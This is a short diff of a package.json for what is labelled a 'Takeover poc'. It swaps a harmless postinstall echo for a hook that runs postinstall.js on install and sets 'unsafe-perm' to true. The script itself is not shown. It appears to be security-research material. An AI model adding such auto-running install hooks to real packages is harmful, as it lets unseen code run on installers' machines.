@@ -3,6 +3,9 @@
   "version": "1.0.0",
   "description": "Takeover poc",
   "scripts": {
-    "postinstall": "echo 'Takeover by Codermak'"
+    "postinstall": "node postinstall.js"
+  },
+  "config": {
+    "unsafe-perm": true
   }
 }
